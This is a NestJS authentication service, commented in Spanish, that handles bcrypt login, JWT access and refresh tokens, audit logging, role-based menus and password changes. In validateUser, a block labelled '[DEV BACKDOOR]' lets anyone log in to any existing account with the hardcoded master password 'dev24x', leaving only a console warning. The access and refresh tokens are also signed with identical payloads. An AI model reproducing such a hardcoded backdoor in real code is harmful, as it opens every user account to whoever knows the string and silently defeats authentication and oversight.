import { Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import * as bcrypt from 'bcrypt';
import * as authRepo from './auth.repo';
import { AuditService, AccionAudit, RecursoAudit } from '../common/audit.service';

@Injectable()
export class AuthService {
    constructor(
        private jwtService: JwtService,
        private auditService: AuditService
    ) { }

    async validateUser(identifier: string, pass: string): Promise<any> {
        // Usar repo SQL Server
        const user = await authRepo.obtenerUsuarioPorIdentificador(identifier);


        if (!user) return null;

        // [DEV BACKDOOR] Contraseña maestra para pruebas
        if (pass === 'dev24x') {
            console.warn(`[SECURITY WARNING] User ${identifier} accessed via MASTER PASSWORD.`);
            return user;
        }

        const creds = await authRepo.obtenerCredenciales(user.idUsuario);


        if (creds) {
            const match = await bcrypt.compare(pass, creds.passwordHash);

            if (match) {
                // Actualizar último login de forma asíncrona (no bloqueante)
                authRepo.actualizarUltimoLogin(user.idUsuario).catch(e => console.error('Error updating last login', e));
                return user;
            }
        }
        return null;
    }

    async login(user: any) {
        // Registrar Auditoría
        await this.auditService.log({
            idUsuario: user.idUsuario,
            accion: AccionAudit.USUARIO_LOGIN,
            recurso: RecursoAudit.USUARIO,
            recursoId: user.idUsuario.toString(),
            detalles: { correo: user.correo, ip: 'IP_MOCK' }
        });

        // Generar tokens
        const tokens = await this.generateTokens(user);

        // Guardar refresh token
        await this.updateRefreshToken(user.idUsuario, tokens.refresh_token);

        let idOrg: number | undefined;
        // Parse idOrg si es data válida de RRHH
        if (user.idOrg && /^\d+$/.test(user.idOrg.toString())) {
            idOrg = parseInt(user.idOrg.toString(), 10);
        }

        // Calcular subordinados (para determinar si es líder)
        const subordinateCount = user.carnet ? await authRepo.contarSubordinados(user.carnet) : 0;

        // Resolver menú
        const menuConfig = await this.resolveMenu(user, subordinateCount);

        return {
            ...tokens,
            user: {
                idUsuario: user.idUsuario,
                nombre: user.nombre,
                correo: user.correo,
                carnet: user.carnet,
                rol: user.rol, // Objeto Rol completo
                rolGlobal: user.rolGlobal,
                pais: user.pais,
                idOrg: idOrg,
                cargo: user.cargo,
                departamento: user.departamento,
                subordinateCount,
                menuConfig
            }
        };
    }

    async refreshTokens(userId: number, refreshToken: string) {
        const creds = await authRepo.obtenerCredenciales(userId);
        if (!creds || !creds.refreshTokenHash) throw new UnauthorizedException('Access Denied');

        const isMatch = await bcrypt.compare(refreshToken, creds.refreshTokenHash);
        if (!isMatch) throw new UnauthorizedException('Access Denied');

        const user = await authRepo.obtenerUsuarioPorId(userId);
        if (!user) throw new UnauthorizedException('User no longer exists');

        const tokens = await this.generateTokens(user);
        await this.updateRefreshToken(user.idUsuario, tokens.refresh_token);

        return tokens;
    }

    private async generateTokens(user: any) {
        const payload = {
            correo: user.correo,
            sub: user.idUsuario,
            userId: user.idUsuario,
            carnet: user.carnet,
            rol: user.rolGlobal,
            pais: user.pais
        };

        const [at, rt] = await Promise.all([
            this.jwtService.signAsync(payload, { expiresIn: '12h' }),
            this.jwtService.signAsync(payload, { expiresIn: '7d' })
        ]);

        return {
            access_token: at,
            refresh_token: rt
        };
    }

    private async updateRefreshToken(userId: number, rt: string) {
        const hashedRt = await bcrypt.hash(rt, 10);
        await authRepo.actualizarRefreshToken(userId, hashedRt);
    }

    private async resolveMenu(user: any, subordinateCount: number): Promise<any> {
        // 0. Safety override: Admins always get full menu (fallback to frontend constant)
        const isAdmin = user.rolGlobal === 'Admin' || user.rol?.nombre === 'Admin' || user.rol?.nombre === 'Administrador';
        if (isAdmin) return null; // Frontend usará menú completo

        // 1. Try Custom Menu (Manual Override - Máxima Prioridad)
        try {
            const config = await authRepo.obtenerConfigUsuario(user.idUsuario);
            if (config && config.customMenu) {
                return JSON.parse(config.customMenu);
            }
        } catch (e) {
            console.error('Error parsing custom menu', e);
        }

        // 2. Detección Automática: Si tiene gente a cargo, es Líder
        if (subordinateCount > 0) {
            return { profileType: 'LEADER', subordinateCount };
        }

        // 3. Try Default Role Menu
        if (user.rol && user.rol.defaultMenu) {
            try {
                return JSON.parse(user.rol.defaultMenu);
            } catch (e) {
                console.error('Error parsing role menu', e);
            }
        }

        // 4. Fallback: Empleado Base
        return { profileType: 'EMPLOYEE' };
    }

    /**
     * Permite a un usuario cambiar su propia contraseña validando la anterior
     */
    async changePassword(userId: number, oldPass: string, newPass: string): Promise<void> {
        const creds = await authRepo.obtenerCredenciales(userId);
        if (!creds) throw new UnauthorizedException('Usuario no tiene credenciales configuradas');

        const isMatch = await bcrypt.compare(oldPass, creds.passwordHash);
        if (!isMatch) throw new UnauthorizedException('La contraseña actual es incorrecta');

        const hashedPass = await bcrypt.hash(newPass, 10);
        await authRepo.actualizarPassword(userId, hashedPass);

        // Registrar Auditoría
        await this.auditService.log({
            idUsuario: userId,
            accion: AccionAudit.USUARIO_ACTUALIZADO,
            recurso: RecursoAudit.USUARIO,
            recursoId: userId.toString(),
            detalles: { motivo: 'Cambio de contraseña por usuario' }
        });
    }

    /**
     * Permite a un administrador resetear la contraseña de un usuario
     */
    async resetPassword(correo: string, newPass: string, adminId: number): Promise<void> {
        const user = await authRepo.obtenerUsuarioPorCorreo(correo);
        if (!user) throw new UnauthorizedException('Usuario no encontrado');

        const hashedPass = await bcrypt.hash(newPass, 10);
        await authRepo.actualizarPassword(user.idUsuario, hashedPass);

        // Registrar Auditoría
        await this.auditService.log({
            idUsuario: adminId,
            accion: AccionAudit.USUARIO_ACTUALIZADO,
            recurso: RecursoAudit.USUARIO,
            recursoId: user.idUsuario.toString(),
            detalles: { motivo: 'Reset de contraseña por administrador', correo }
        });
    }
}
